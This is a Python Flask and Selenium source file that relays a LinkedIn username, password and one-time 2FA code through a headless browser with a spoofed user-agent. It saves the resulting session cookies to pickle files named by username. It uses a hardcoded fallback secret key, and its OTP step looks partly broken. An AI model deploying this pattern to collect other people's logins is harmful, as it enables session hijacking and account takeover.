from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
import time
import logging
import pickle
import os

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.environ.get('FLASK_SECRET_KEY', 'your-secret-key-here')

def init_driver():
    """Initialize and configure Chrome WebDriver with improved options"""
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--window-size=1920,1080')  # Set a standard resolution
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
    
    try:
        driver = webdriver.Chrome(options=chrome_options)
        return driver
    except Exception as e:
        logger.error(f"Failed to initialize driver: {str(e)}")
        raise

def wait_and_find_element(driver, by, value, timeout=10, clickable=False):
    """Enhanced helper function to wait for and find an element"""
    try:
        if clickable:
            element = WebDriverWait(driver, timeout).until(
                EC.element_to_be_clickable((by, value))
            )
        else:
            element = WebDriverWait(driver, timeout).until(
                EC.presence_of_element_located((by, value))
            )
        return element
    except TimeoutException:
        logger.error(f"Timeout waiting for element: {value}")
        return None
    except Exception as e:
        logger.error(f"Error finding element {value}: {str(e)}")
        return None

def handle_password_step(driver, username, password):
    """Handle the initial password authentication step with improved error handling"""
    try:
        # Wait for the page to load completely
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.TAG_NAME, "body"))
        )
        
        # Ensure we're on the login page
        current_url = driver.current_url
        if "linkedin.com/login" not in current_url:
            logger.error(f"Unexpected URL: {current_url}")
            return False
            
        # Clear and enter username
        username_field = wait_and_find_element(driver, By.ID, "username")
        if not username_field:
            logger.error("Username field not found")
            return False
        username_field.clear()
        username_field.send_keys(username)
        
        # Clear and enter password
        password_field = wait_and_find_element(driver, By.ID, "password")
        if not password_field:
            logger.error("Password field not found")
            return False
        password_field.clear()
        password_field.send_keys(password)
        
        # Find and click submit button
        submit_button = wait_and_find_element(
            driver, 
            By.CSS_SELECTOR, 
            "button[type='submit']", 
            clickable=True
        )
        if not submit_button:
            logger.error("Submit button not found")
            return False
            
        submit_button.click()
        
        # Wait for navigation
        time.sleep(2)
        
        # Check for error messages
        try:
            error_message = driver.find_element(By.ID, "error-for-username")
            if error_message.is_displayed():
                logger.error(f"Login error: {error_message.text}")
                return False
        except NoSuchElementException:
            pass
            
        return True
        
    except Exception as e:
        logger.error(f"Error in password step: {str(e)}")
        return False

def handle_otp_step(driver, otp):
    """Handle the OTP verification step with improved detection"""
    try:
        # Check if OTP input exists
        otp_field = wait_and_find_element(
            driver, 
            By.CSS_SELECTOR, 
            "input[name='pin']",
            timeout=5
        )
        
        if not otp_field:
            # If no OTP field is found, check if we're already logged in
            try:
                profile_nav = driver.find_element(By.ID, "global-nav")
                if profile_nav.is_displayed():
                    logger.info("Already logged in, no OTP required")
                    return True
            except NoSuchElementException:
                pass
            logger.error("Neither OTP field nor profile nav found")
            return False
            
        # Enter OTP
        otp_field.clear()
        otp_field.send_keys(otp)
        
        # Find and click verify button
        verify_button = wait_and_find_element(
            driver,
            By.CSS_SELECTOR,
            "button[type='submit']",
            clickable=True
        )
        if not verify_button:
            logger.error("Verify button not found")
            return False
            
        verify_button.click()
        
        # Wait for verification
        time.sleep(3)
        
        # Check for successful login
        try:
            profile_nav = WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.ID, "global-nav"))
            )
            return True
        except TimeoutException:
            logger.error("Failed to verify OTP - navigation element not found")
            return False
            
    except Exception as e:
        logger.error(f"Error in OTP step: {str(e)}")
        return False

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/submit-password', methods=['POST'])
def submit_password():
    username = request.form.get('username')
    password = request.form.get('password')
    
    if not username or not password:
        return jsonify({
            'success': False,
            'message': 'Username and password are required'
        })
    
    driver = None
    try:
        driver = init_driver()
        driver.get('https://www.linkedin.com/login')
        
        if handle_password_step(driver, username, password):
            session['username'] = username
            session['driver_cookies'] = driver.get_cookies()
            return jsonify({'success': True})
        
        return jsonify({
            'success': False,
            'message': 'Login failed. Please check your credentials.'
        })
        
    except Exception as e:
        logger.error(f"Error in submit_password: {str(e)}")
        return jsonify({
            'success': False,
            'message': 'An error occurred during login'
        })
    finally:
        if driver:
            driver.quit()

@app.route('/otp')
def otp_page():
    if 'username' not in session:
        return redirect(url_for('index'))
    return render_template('templates\otp.html')

@app.route('/submit-otp', methods=['POST'])
def submit_otp():
    if 'username' not in session:
        return jsonify({
            'success': False,
            'message': 'Session expired. Please login again.'
        })
    
    otp = request.form.get('otp')
    if not otp and 'skip_otp' not in request.form:
        return jsonify({
            'success': False,
            'message': 'OTP is required'
        })
    
    driver = None
    try:
        driver = init_driver()
        driver.get('https://www.linkedin.com/login')
        
        # Restore cookies from password step
        for cookie in session.get('driver_cookies', []):
            driver.add_cookie(cookie)
        
        driver.get('https://www.linkedin.com')  # Navigate after setting cookies
        
        if handle_otp_step(driver, otp):
            # Save successful login cookies
            cookies = driver.get_cookies()
            cookie_dir = 'cookies'
            if not os.path.exists(cookie_dir):
                os.makedirs(cookie_dir)
                
            cookie_path = os.path.join(
                cookie_dir, 
                f"linkedin_cookies_{session['username']}.pkl"
            )
            
            with open(cookie_path, 'wb') as file:
                pickle.dump(cookies, file)
                
            return jsonify({'success': True})
            
        return jsonify({
            'success': False,
            'message': 'OTP verification failed'
        })
        
    except Exception as e:
        logger.error(f"Error in submit_otp: {str(e)}")
        return jsonify({
            'success': False,
            'message': 'An error occurred during OTP verification'
        })
    finally:
        if driver:
            driver.quit()

if __name__ == '__main__':
    app.run(debug=False)  # Set debug=False for production